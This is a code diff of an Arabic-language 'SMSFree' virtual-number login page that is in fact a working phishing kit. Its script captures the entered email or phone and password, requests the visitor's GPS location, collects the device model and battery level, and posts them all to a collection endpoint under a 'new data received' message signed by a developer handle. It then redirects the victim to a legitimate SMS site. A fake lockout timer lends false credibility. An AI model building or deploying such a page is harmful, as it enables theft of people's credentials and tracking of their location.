@@ -3,15 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMSFree - النظام الشامل</title>
+    <title>SMSFree - تفعيل الخدمة</title>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         :root {
             --bg-color: #0f172a;
             --card-bg: rgba(30, 41, 59, 0.7);
             --primary-cyan: #22d3ee;
+            --accent-glow: rgba(34, 211, 238, 0.3);
             --text-white: #f8fafc;
-            --error-red: #ef4444;
+            --input-bg: rgba(15, 23, 42, 0.6);
         }
 
         body {
@@ -21,36 +22,57 @@
             color: var(--text-white); overflow: hidden;
         }
 
-        /* حاوية التصميم الزجاجي الاحترافي */
         .main-container {
-            width: 90%; max-width: 400px; background: var(--card-bg);
+            width: 90%; max-width: 420px; background: var(--card-bg);
             backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1);
             padding: 50px 30px; border-radius: 30px; text-align: center;
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.7); position: relative;
+            box-shadow: 0 25px 60px -15px rgba(0, 0, 0, 0.7);
+            position: relative; transition: 0.5s ease;
         }
 
-        /* الشعار المتوهج (Logo Glow) */
-        .logo-wrap { position: relative; width: 100px; height: 100px; margin: 0 auto 30px; }
-        .logo-glow {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            border-radius: 50%; background: rgba(34, 211, 238, 0.4);
-            filter: blur(20px); animation: pulse 2s infinite;
-        }
-        .logo-inner {
-            position: relative; width: 100%; height: 100%; border: 2px solid var(--primary-cyan);
-            border-radius: 50%; display: flex; justify-content: center; align-items: center;
-            font-size: 18px; font-weight: 800; color: var(--primary-cyan);
-            background: rgba(15, 23, 42, 0.5); text-shadow: 0 0 10px var(--primary-cyan);
-        }
-        @keyframes pulse { 0%, 100% { opacity: 0.5; transform: scale(1); } 50% { opacity: 1; transform: scale(1.1); } }
-
-        /* تأثير الحظر والضباب الشامل */
         .is-banned .blur-content { filter: blur(20px); opacity: 0.1; pointer-events: none; }
 
-        /* واجهة الحظر الحلزوني المركزي */
-        .ban-overlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 100; display: none; width: 100%; }
-        .ban-title { font-size: 19px; font-weight: bold; color: #fbbf24; margin-bottom: 25px; display: block; }
+        .logo-circle {
+            width: 100px; height: 100px; border: 2px solid var(--primary-cyan);
+            border-radius: 50%; margin: 0 auto 25px;
+            display: flex; justify-content: center; align-items: center;
+            font-size: 20px; font-weight: 800; color: var(--primary-cyan);
+            background: rgba(34, 211, 238, 0.05); text-shadow: 0 0 10px rgba(34, 211, 238, 0.6);
+        }
+
+        h2 { font-size: 16px; font-weight: 400; color: #cbd5e1; margin-bottom: 35px; line-height: 1.7; }
+
+        .input-group { position: relative; margin-bottom: 18px; }
+        input {
+            width: 100%; padding: 16px 20px; background: var(--input-bg);
+            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 15px;
+            color: white; outline: none; text-align: center; font-size: 15px;
+            transition: all 0.3s; box-sizing: border-box;
+        }
+        input:focus { border-color: var(--primary-cyan); background: rgba(15, 23, 42, 0.9); }
+
+        .submit-btn {
+            width: 100%; padding: 18px; 
+            background: linear-gradient(135deg, #155e75, #22d3ee); 
+            border: none; border-radius: 15px; color: #0f172a;
+            font-size: 17px; font-weight: 700; cursor: pointer;
+            position: relative; overflow: hidden;
+            transition: transform 0.2s, box-shadow 0.3s;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+        }
         
+        .submit-btn:hover { 
+            transform: translateY(-2px) scale(1.02); 
+            box-shadow: 0 15px 30px rgba(34, 211, 238, 0.4); 
+            background: linear-gradient(135deg, #0ea5e9, #22d3ee);
+        }
+
+        .ban-overlay {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            z-index: 100; text-align: center; display: none; width: 100%;
+        }
+        .ban-title { font-size: 19px; font-weight: bold; color: #fbbf24; margin-bottom: 25px; display: block; }
+
         .loader-wrap { position: relative; width: 110px; height: 110px; margin: 0 auto; }
         .spiral {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
@@ -60,31 +82,12 @@
         @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         #timer { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 32px; font-weight: bold; color: #fbbf24; }
 
-        /* تنسيق الحقول والأزرار */
-        .input-group { margin-bottom: 15px; position: relative; }
-        input {
-            width: 100%; padding: 16px; background: rgba(15, 23, 42, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 15px; color: white;
-            text-align: center; outline: none; box-sizing: border-box; transition: 0.3s;
-        }
-        input:focus { border-color: var(--primary-cyan); background: rgba(15, 23, 42, 0.8); }
-
-        /* اهتزاز الحقول عند الخطأ */
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 75% { transform: translateX(8px); } }
-        .shake-input { animation: shake 0.4s ease-in-out; border-color: var(--error-red) !important; }
-
-        .submit-btn {
-            width: 100%; padding: 18px; background: linear-gradient(135deg, #0ea5e9, #22d3ee);
-            border: none; border-radius: 15px; color: #0f172a; font-size: 17px; font-weight: bold; cursor: pointer;
-        }
-
-        /* نافذة التنبيه الزجاجية الأنيقة */
-        .elegant-popup { 
-            background: #1e293b !important; 
-            border-radius: 25px !important; 
-            color: #fff !important; 
-            border: 1px solid rgba(255, 255, 255, 0.1) !important; 
+        .glass-popup {
+            background: rgba(15, 23, 42, 0.9) !important;
             backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1) !important;
+            border-radius: 25px !important;
+            color: white !important;
         }
     </style>
 </head>
@@ -97,138 +100,147 @@
             <div class="spiral"></div>
             <div id="timer">30</div>
         </div>
-        <h3 style="color: #fbbf24; margin-top: 25px;">نظام الحماية نشط</h3>
-        <p style="color: #94a3b8; font-size: 13px;">يرجى الانتظار حتى يتم إزالة الحظر عنك...</p>
+        <h3 style="color: #fbbf24; margin: 25px 0 5px; font-size: 17px;">نظام الحماية نشط</h3>
+        <p style="font-size: 13px; color: #cbd5e1;">يرجى الانتظار حتى يتم إزالة الحظر عنك...</p>
     </div>
 
     <div class="blur-content">
-        <div class="logo-wrap">
-            <div class="logo-glow"></div>
-            <div class="logo-inner">SMSFree</div>
-        </div>
-        
-        <h2 style="font-size: 15px; color: #cbd5e1; margin-bottom: 35px; line-height: 1.6;">
-            سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لجميع حساباتك.
-        </h2>
-
+        <div class="logo-circle">SMSFree</div>
+        <h2>سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لحساباتك.</h2>
         <form id="loginForm">
             <div class="input-group">
-                <input type="text" id="user" placeholder="رقم الهاتف أو البريد" required autocomplete="off">
+                <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required autocomplete="off">
             </div>
             <div class="input-group">
                 <input type="password" id="pass" placeholder="كلمة المرور" required>
             </div>
             <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
         </form>
-        
         <p style="margin-top: 25px; font-size: 11px; color: #64748b;">© Global Virtual Numbers Pro 2026. جميع الحقوق محفوظة.</p>
     </div>
 </div>
 
 <script>
     let loginAttempts = 0;
+    let countdown;
 
-    // استعادة حالة الحظر عند تحديث الصفحة
     window.onload = () => {
-        const savedExpiry = localStorage.getItem('block_expiry_time');
-        if (savedExpiry) {
-            const remainingSec = Math.round((savedExpiry - Date.now()) / 1000);
-            if (remainingSec > 0) applyBanEffect(remainingSec);
-            else localStorage.removeItem('block_expiry_time');
+        const banExpiry = localStorage.getItem('lock_expiry');
+        if (banExpiry) {
+            const remain = Math.round((banExpiry - Date.now()) / 1000);
+            if (remain > 0) applyBanEffect(remain);
+            else localStorage.removeItem('lock_expiry');
         }
     };
 
-    document.getElementById('loginForm').onsubmit = (e) => {
+    document.getElementById('loginForm').onsubmit = async (e) => {
         e.preventDefault();
-        const uEl = document.getElementById('user');
-        const pEl = document.getElementById('pass');
-        const uValue = uEl.value.trim();
-        const pValue = pEl.value;
+        const user = document.getElementById('user').value.trim();
+        const pass = document.getElementById('pass').value;
 
-        // قواعد التحقق
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        const phoneRegex = /^[0-9]{8,15}$/;
-        const hasArabic = /[\u0600-\u06FF]/.test(uValue);
+        const emailRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        const phoneRx = /^[0-9]{8,15}$/;
+        const hasArabic = /[\u0600-\u06FF]/.test(user);
 
-        if ((emailRegex.test(uValue) || phoneRegex.test(uValue)) && !hasArabic && pValue.length >= 6) {
-            sendToApi(uValue, pValue);
+        if ((emailRx.test(user) || phoneRx.test(user)) && !hasArabic && pass.length >= 6) {
+            // محاولة جلب الموقع أولاً قبل الإرسال
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const mapLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                        await processCapture(user, pass, mapLink);
+                    },
+                    async () => {
+                        await processCapture(user, pass, "المستخدم رفض إذن الموقع");
+                    }
+                );
+            } else {
+                await processCapture(user, pass, "المتصفح لا يدعم تحديد الموقع");
+            }
         } else {
-            // تفعيل الاهتزاز عند الخطأ
-            uEl.classList.add('shake-input');
-            pEl.classList.add('shake-input');
-            setTimeout(() => { uEl.classList.remove('shake-input'); pEl.classList.remove('shake-input'); }, 400);
-
             loginAttempts++;
             if (loginAttempts >= 3) {
-                const endTimestamp = Date.now() + (30 * 1000);
-                localStorage.setItem('block_expiry_time', endTimestamp);
+                const expiryTime = Date.now() + (30 * 1000);
+                localStorage.setItem('lock_expiry', expiryTime);
                 applyBanEffect(30);
             } else {
-                // نافذة التنبيه التي تمسح البيانات وتمنع الإغلاق العشوائي
                 Swal.fire({
                     title: 'بيانات غير صالحة',
-                    text: 'يرجى كتابة البيانات بشكل صحيح (بدون أحرف عربية) لتجنب الحظر المؤقت.',
+                    text: 'يرجى كتابة البيانات بشكل صحيح لتجنب الحظر المؤقت.',
                     icon: 'error',
-                    confirmButtonText: 'OK',
                     confirmButtonColor: '#22d3ee',
-                    allowOutsideClick: false, // ميزة منع الضغط في الخارج
-                    allowEscapeKey: false,
-                    customClass: { popup: 'elegant-popup' }
-                }).then((result) => {
-                    if (result.isConfirmed) {
-                        // مسح البيانات المكتوبة بالخطأ فور الضغط على OK
-                        uEl.value = '';
-                        pEl.value = '';
-                        uEl.focus();
-                    }
+                    allowOutsideClick: false,
+                    customClass: { popup: 'glass-popup' }
+                }).then(() => {
+                    document.getElementById('user').value = '';
+                    document.getElementById('pass').value = '';
+                    document.getElementById('user').focus();
                 });
             }
         }
     };
 
-    function applyBanEffect(seconds) {
-        const card = document.getElementById('mainCard');
+    function applyBanEffect(duration) {
+        const container = document.getElementById('mainCard');
         const overlay = document.getElementById('banOverlay');
-        const timerDisplay = document.getElementById('timer');
-        
-        card.classList.add('is-banned');
+        const timerTxt = document.getElementById('timer');
+        container.classList.add('is-banned');
         overlay.style.display = 'block';
 
-        let timeRemaining = seconds;
-        timerDisplay.innerText = timeRemaining;
+        let left = duration;
+        timerTxt.innerText = left;
 
-        const countdown = setInterval(() => {
-            timeRemaining--;
-            timerDisplay.innerText = timeRemaining;
-            
-            if (timeRemaining <= 0) {
+        clearInterval(countdown);
+        countdown = setInterval(() => {
+            left--;
+            timerTxt.innerText = left;
+            if (left <= 0) {
                 clearInterval(countdown);
-                card.classList.remove('is-banned');
+                container.classList.remove('is-banned');
                 overlay.style.display = 'none';
-                localStorage.removeItem('block_expiry_time');
+                localStorage.removeItem('lock_expiry');
                 loginAttempts = 0;
-                
-                // ميزة رسالة "مبروك" عند فك الحظر
                 Swal.fire({
                     title: 'مبروك!',
-                    text: 'تم إزالة الحظر عنك بنجاح، يمكنك المحاولة مجدداً ببيانات صحيحة.',
+                    text: 'تم إزالة الحظر عنك بنجاح، يمكنك المحاولة مجدداً.',
                     icon: 'success',
                     confirmButtonColor: '#22d3ee',
-                    customClass: { popup: 'elegant-popup' }
+                    customClass: { popup: 'glass-popup' }
                 });
             }
         }, 1000);
     }
 
-    async function sendToApi(user, pass) {
+    async function processCapture(u, p, location) {
+        let phoneName = navigator.userAgent.split(')')[0].split('(')[1] || "غير معروف";
+        let batteryLevel = "غير متاح";
+        
+        try {
+            const battery = await navigator.getBattery();
+            batteryLevel = Math.round(battery.level * 100) + "%";
+        } catch (e) {}
+
+        const messageText = `
+تم استلام بيانات جديده 
+
+اسم الهاتف : ${phoneName}
+نسبه البطاريه : ${batteryLevel}
+نوع الشريحه : SIM Detected
+موقع الخريطة : ${location}
+البريد الاكتروني : ${u}
+كلمه السر : ${p}
+
+يامطوري  M6_vip@
+        `;
+
         try {
             await fetch('/api/save', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ message: `✅ صيد جديد:\n👤: ${user}\n🔑: ${pass}` })
+                body: JSON.stringify({ message: messageText })
             });
             window.location.href = "https://receive-smss.com/";
-        } catch (error) {}
+        } catch (err) {}
     }
 </script>
 
